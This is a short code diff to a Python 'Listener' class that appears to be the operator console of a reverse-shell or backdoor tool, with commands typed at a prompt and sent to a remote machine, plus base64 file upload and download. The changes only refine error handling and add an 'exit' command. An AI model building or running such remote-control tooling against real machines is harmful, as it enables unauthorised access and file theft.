@@ -56,8 +56,10 @@ class Listener:
         try:
             with open(path, "rb") as file:
                 return base64.b64encode(file.read()).decode()
-        except Exception:
+        except FileNotFoundError:
             return "[-] File not found"
+        except Exception as e:
+            return f"[-] Exception: {e}"
 
     def cleanup(self):
         print("[+] Closing connection...")
@@ -68,6 +70,11 @@ class Listener:
         while True:
             data = input(">> ")
             command = data.split(" ", 1)
+
+            if command[0] == "exit":
+                self.send("exit")
+                self.cleanup()
+                return
 
             if command[0] == "upload":
                 file_content = self.upload_file(command[1])
@@ -86,6 +93,7 @@ class Listener:
                         print(download_result) 
                     except Exception as e:
                         print(f"[-] Error during file/folder download: {str(e)}")
+            
             else:
                 print(result)
 
